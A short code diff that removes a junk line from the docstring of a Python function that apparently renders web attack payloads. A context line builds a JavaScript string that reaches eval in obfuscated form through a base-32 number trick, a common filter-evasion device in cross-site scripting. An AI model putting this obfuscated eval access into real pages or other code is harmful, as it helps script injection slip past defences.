@@ -18,8 +18,6 @@ def generate(
     
     Returns:
     - Rendered payload string.
-    hasdshADS;HOIDFASH;'KFDHA'KLSFDAS'HLK
-
     """
     gh0st = f"var fn=window[490837..toString(1<<5)];"
     if command:
